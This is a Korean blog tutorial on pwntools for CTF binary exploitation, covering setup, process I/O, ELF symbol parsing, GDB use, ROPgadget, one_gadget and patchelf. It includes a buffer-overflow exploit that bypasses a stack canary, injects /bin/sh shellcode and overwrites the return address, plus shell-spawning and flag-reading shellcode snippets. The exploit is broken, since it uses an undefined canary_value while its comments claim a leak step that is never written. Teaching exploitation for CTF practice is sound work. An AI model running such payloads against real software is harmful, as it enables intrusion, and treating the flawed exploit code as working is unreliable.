---
title: "Pwntools 기초 및 활용법: 바이너리 익스플로잇 자동화, ROPgadget, one_gadget 가이드"
description: "시스템 해킹 및 CTF 취약점 익스플로잇 작성을 위한 파이썬 Pwntools 라이브러리의 설치부터 로컬·원격 프로세스 I/O 제어, ELF 심볼 분석, ROPgadget과 one_gadget을 활용한 페이로드 자동화 기법을 총정리합니다."
slug: "pwntools-python-exploit-scripting-guide"
date: 2024-03-09T10:09:44+09:00
lastmod: 2026-10-18T18:00:00+09:00
draft: false
categories: ["Security"]
tags: ["pwntools", "python", "system-hacking", "exploit", "security", "pwnable"]
ShowToc: true
TocOpen: true
---

# Pwntools 기초 및 활용 가이드

## Pwntools 개요 및 개발 환경 구축
Pwntools는 시스템 해킹(Pwnable) 및 CTF 문제 풀이, 익스플로잇 작성을 고속 자동화하기 위해 개발된 파이썬 프레임워크입니다. 소켓 통신, 프로세스 핸들링, ELF 파일 파싱, 어셈블/디스어셈블 등의 기능을 통합 제공합니다.

### 설치 방법 (APT 및 Pip)
우분투 리눅스 환경에서 다음 패키지들을 설치한 후 pip를 통해 최신 버전을 설치합니다.

```bash
sudo apt-get update
sudo apt-get install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

### Dockerfile 기반 격리 환경 구성
호스트 시스템의 libc 버전과 상관없이 일관된 분석 환경을 유지하기 위해 도커(Docker) 컨테이너를 구성할 수 있습니다.

```dockerfile
FROM ubuntu:18.04

ENV PATH="${PATH}:/usr/local/lib/python3.6/dist-packages/bin"
ENV LC_CTYPE=C.UTF-8

RUN apt update && apt install -y \
    gcc git python3 python3-pip ruby sudo tmux vim wget

# pwndbg 설치
WORKDIR /root
RUN git clone https://github.com/pwndbg/pwndbg && \
    cd pwndbg && git checkout 2023.03.19 && ./setup.sh

# pwntools 및 one_gadget 설치
RUN pip3 install --upgrade pip && pip3 install pwntools
RUN gem install one_gadget

WORKDIR /root
```

### pwndbg 모듈 초기화 에러 해결
GDB 구동 시 `partially initialized module 'pwndbg' has no attribute 'lib'` 오류가 발생하는 경우, 로케일 인코딩 설정이 누락된 것이 원인입니다. 쉘 환경에 다음 환경 변수를 추가합니다.
```bash
export LANG=C.UTF-8
```

## 기본 사용법과 입출력 제어
파이썬 스크립트 상단에서 `from pwn import *`를 선언하여 모든 모듈을 로드합니다.

### 프로세스 및 원격 연결 (process / remote)
- 로컬 프로세스 실행:
  ```python
  # 로컬 바이너리 실행
  target = process('./vuln_binary')

  # 특정 libc 파일을 강제 로드(LD_PRELOAD)하여 실행
  target = process('./vuln_binary', env={"LD_PRELOAD": "./libc.so.6"})
  ```
- 원격 서버 소켓 연결:
  ```python
  target = remote('ctf.example.com', 1337)
  ```

### 데이터 송수신 (send / recv)
- 송신 메서드:
  - `target.send(b'payload')`: 바이너리 바이트 스트림 주입
  - `target.sendline(b'payload')`: 페이로드 뒤에 `\n` 개행 문자를 덧붙여 전송
  - `target.sendafter(b'Input: ', b'payload')`: 특정 프롬프트 문자열이 수신될 때까지 대기 후 페이로드 전송
  - `target.sendlineafter(b'Input: ', b'payload')`: 프롬프트 대기 후 개행 포함 전송
- 수신 메서드:
  - `data = target.recv(1024)`: 최대 1024바이트 수신
  - `data = target.recvn(8)`: 정확히 8바이트가 수신될 때까지 대기
  - `line = target.recvline()`: 개행 문자(`\n`)까지 한 줄 수신
  - `data = target.recvuntil(b'> ')`: 특정 마커 문자열이 나올 때까지 수신
  - `data = target.recvall()`: 프로세스가 종료될 때까지 전체 출력 수신

### 데이터 패킹 및 언패킹 (p64, u64)
리눅스 x86-64 시스템의 리틀 엔디안(Little-Endian) 바이트 순서 변환을 수행합니다.
- 패킹 (정수 주소 -> 바이트 스트림):
  - `p32(0x08048000)`: 32비트 4바이트 리틀 엔디안 변환
  - `p64(0x7ffff7a00000)`: 64비트 8바이트 리틀 엔디안 변환
- 언패킹 (바이트 스트림 -> 정수 주소):
  - `u32(raw_bytes)`: 4바이트 스트림을 정수로 복원
  - `u64(raw_bytes.ljust(8, b'\x00'))`: 6바이트 등 불완전한 메모리 유출 값을 8바이트로 맞춘 후 정수로 복원

### 어셈블 및 디스어셈블 (asm / disasm)
- 어셈블: 어셈블리 텍스트를 기계어 바이트코드로 변환합니다.
  ```python
  context.arch = 'amd64'
  code = asm('mov rax, 0x3b; syscall')
  ```
- 디스어셈블: 기계어 바이트를 어셈블리 텍스트로 복원합니다.
  ```python
  print(disasm(b'\xb8\x3b\x00\x00\x00\x0f\x05'))
  ```

### 대화형 쉘 획득 (interactive)
익스플로잇 성공 후 사용자가 터미널을 통해 획득한 쉘 권한과 직접 상호작용할 수 있도록 제어권을 사용자 표준 입출력으로 넘깁니다.
```python
target.interactive()
```

## 바이너리 분석 및 디버깅 연동

### ELF 심볼 및 PLT/GOT 분석
`ELF` 클래스를 통해 타깃 바이너리 및 라이브러리의 심볼과 테이블 주소를 파싱할 수 있습니다.
```python
elf = ELF('./vuln_binary')
libc = ELF('./libc.so.6')

# PLT 및 GOT 주소 추출
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# 바이너리 내 전역 변수 및 함수 주소
target_buf = elf.symbols['target_buf']

# 라이브러리 내 함수 상대 오프셋
system_offset = libc.symbols['system']

# 라이브러리 내 문자열 오프셋 검색
binsh_offset = next(libc.search(b'/bin/sh'))
```

### Context 환경 설정
아키텍처, 엔디안, 로그 레벨 등을 전역 설정합니다.
```python
context.arch = 'amd64'           # 'i386', 'arm', 'aarch64'
context.endian = 'little'
context.log_level = 'debug'      # 송수신되는 모든 입출력 패킷 로깅
```

### GDB 디버거 연동 (gdb.attach)
익스플로잇 스크립트 실행 도중 GDB를 자식 프로세스에 붙여 메모리 상태를 점검할 수 있습니다.
```python
p = process('./vuln_binary')

# GDB 연결 및 브레이크포인트 설정
gdb.attach(p, '''
    b *main+0x40
    c
''')
pause() # 프로세스를 일시 정지하여 수동 점검 가능
```

### 카나리 우회 익스플로잇 예제
스택 카나리가 적용된 바이너리에서 버퍼 오버플로우를 통해 카나리를 보존하면서 리턴 주소를 덮어쓰는 전형적인 익스플로잇 구조입니다.

```python
from pwn import *

context.arch = 'amd64'
p = process('./vuln_binary')

buf_size = 0x40

# 1. 쉘코드 생성
shellcode = asm(shellcraft.sh())

# 2. 카나리 릭 및 버퍼 주소 수집
p.recvuntil(b'Buffer: ')
buf_addr = int(p.recvline(), 16)

# 3. 카나리를 유출하고 페이로드 빌드
payload = shellcode.ljust(buf_size, b'A')
payload += p64(canary_value)       # 카나리 정상 복원
payload += b'B' * 8                # Saved RBP (SFP) 더미
payload += p64(buf_addr)           # 리턴 주소를 쉘코드가 위치한 버퍼로 덮어쓰기

p.sendlineafter(b'Input: ', payload)
p.interactive()
```

## 보조 익스플로잇 도구 활용

### checksec 보안 기법 점검
바이너리에 컴파일 타임에 적용된 보호 기법 현황을 확인합니다.
- `Arch`: 아키텍처 및 비트수
- `RELRO`: No / Partial / Full RELRO (.got 보호 수준)
- `Stack`: Canary 적용 여부
- `NX`: 스택/힙 메모리 실행 권한 차단 여부 (No-Execute)
- `PIE`: Position Independent Executable (코드 영역 무작위 배치 여부)

### shellcraft 쉘코드 생성
사전 정의된 검증된 시스템 콜 쉘코드를 손쉽게 생성할 수 있습니다.
```python
# /bin/sh 실행 쉘코드
sc = asm(shellcraft.sh())

# 파일 읽기 ORW 쉘코드
sc_orw = asm(shellcraft.open('flag.txt') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100))
```

### ROPgadget 리턴 가젯 추출
ROP 체인 구성을 위해 바이너리에서 `ret`로 끝나는 유용한 명령어 조각(Gadget)을 탐색합니다.
```bash
# rdi 레지스터를 세팅하는 가젯 탐색
ROPgadget --binary ./vuln_binary --re "pop rdi"

# 스택 16바이트 정렬을 위한 단순 ret 가젯 탐색
ROPgadget --binary ./vuln_binary --re "ret"
```

### one_gadget 원샷 가젯 탐색
glibc 라이브러리 내부에서 특정 레지스터 조건만 만족하면 단 한 번의 호출로 `execve("/bin/sh", NULL, NULL)`을 실행시키는 가젯 오프셋을 자동 탐색합니다.
```bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

### patchelf 라이브러리 의존성 패치
로컬 환경과 다른 특정 버전의 `libc.so.6` 및 동적 링커(`ld-linux-x86-64.so.2`)를 타깃 바이너리에 강제 바인딩할 때 사용합니다.
```bash
# 동적 링커(인터프리터) 경로 변경
patchelf --set-interpreter ./ld-2.27.so ./vuln_binary

# 의존 공유 라이브러리 교체
patchelf --replace-needed libc.so.6 ./libc-2.27.so ./vuln_binary
```